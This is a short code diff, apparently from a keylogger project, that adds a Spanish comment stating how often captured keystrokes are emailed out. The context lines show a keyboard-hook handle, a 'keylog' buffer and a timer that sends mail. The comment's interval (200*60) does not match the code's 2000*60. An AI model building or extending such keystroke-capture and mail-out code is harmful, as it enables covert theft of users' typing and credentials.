@@ -33,6 +33,7 @@ void TimerSendMail() {
 		keylog = "";
 }
 
+/*Frecuencia con la cual se envían los correos (200*60) ms/*/
 Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
 
 HHOOK eHook = NULL;
